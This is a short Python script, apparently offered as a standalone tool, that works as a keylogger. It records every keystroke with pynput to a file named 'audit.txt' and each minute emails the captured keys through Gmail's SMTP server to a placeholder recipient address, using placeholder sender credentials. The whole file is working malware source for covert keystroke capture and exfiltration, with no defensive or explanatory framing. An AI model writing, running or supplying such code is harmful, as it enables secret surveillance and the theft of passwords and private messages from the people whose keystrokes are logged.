from pynput import keyboard 
import smtplib , ssl , time

sender_mail = "Sender@gmail.com"
receiver_mail = "reciver@gmail.com"
password = "2wat attentication password"
port = 587
message = "The keys will be \n"

print('The program will start ')

def write(value):
    with open("audit.txt", 'a') as file:  
        file.write(value)

def key_press(key):
    try:
        if key == keyboard.Key.enter:
            write("\n")
        else:
            print(key.char)
            write(key.char)
            
    except AttributeError:
        if key == keyboard.Key.backspace:
            print('BACKSPACE PRESS')
            write("\nPress Backspace  \n")
        elif key == keyboard.Key.tab:
            print('TAB PRESS')
            write("\nPress Tab \n")
        elif key == keyboard.Key.space:
            print('SPACE')
            write(" ")
        else:
            temp = repr(key) + " Pressed.\n"
            write(temp)
            print("\n{} Pressed.\n".format(key))
 
listener = keyboard.Listener(on_press=key_press)
listener.start()

while True:
    time.sleep(60)
    
    with open("audit.txt", 'r') as file:
        temp = file.read()
        message += temp
    
    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP("smtp.gmail.com", port)
        server.starttls(context=context)
        server.login(sender_mail, password)
        
        server.sendmail(sender_mail, receiver_mail, message)
        print("Email sent to", receiver_mail)
        
        message = "The keys will be \n"
        
        server.quit()
    except Exception as e:
        print("Error:", e)
        print("Failed to send email.")
